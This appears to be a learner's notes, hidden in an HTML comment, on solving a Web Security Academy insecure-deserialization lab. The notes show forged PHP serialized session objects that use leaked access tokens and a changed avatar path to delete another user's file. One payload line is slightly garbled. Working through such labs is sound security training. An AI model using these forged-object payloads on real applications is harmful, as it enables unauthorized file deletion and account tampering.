<!-- 
1) login as backup user gregg and get the session cookie base64 decoded
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"zhzgwhtjwy774lih6tocceg3u8al33g0";s:11:"avatar_link";s:18:"users/gregg/avatar";}

// There is no delete file functionality...only delete account functionality which will also 
delete files associated with some user along with the avatar.

2) Modify the cookie for our goal and encode it base64 to pass to deletion endpoint
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:23:"users/carlos/morale.txt";}

3) Delete the user gregg to get the post /delete endpoint request and change the referer for carlos
Referer: https://0a3400c003eaecee80ef671d00600099.web-security-academy.net/my-account?id=carlos
now pass the cookie generated earlier, you get "invalid access token for carlos" error
but the list of tokens is revealed here.

PHP Fatal error:  Uncaught Exception: 
(DEBUG: $access_tokens[$user-&gt;username] = 

$access_tokens = [dt5psfgvzv6ythibk65fmgtqga20jxsj,  ///this was WIENER's token
                  zhzgwhtjwy774lih6tocceg3u8al33g0,   ///this was greggs token
                  zh5bui9holcjru1uxel1vdev6qqramyp])    
Invalid access token for user carlos in /var/www/index.php:8 

So our deserialised object should now be after directory error, we get an idea of path of carlos home dir
anyways the structure in linux systems is /home/usersname
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zh5bui9holcjru1uxel1vdev6qqramyp";s:11:"avatar_link";s:19:"users/wiener/avatar"O30%3d


WE DONT NEED CARLOS TOKEN WE JUST NEED TO MODIFY THE FILE PATH FOR AVATAR_LINK TO POINT TO MORALE.TXT
Capture wiener's post delete request and modify the object
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zh5bui9holcjru1uxel1vdev6qqramyp";s:11:"avatar_link";s:19:"users/wiener/avatar";}
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zh5bui9holcjru1uxel1vdev6qqramyp";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
 -->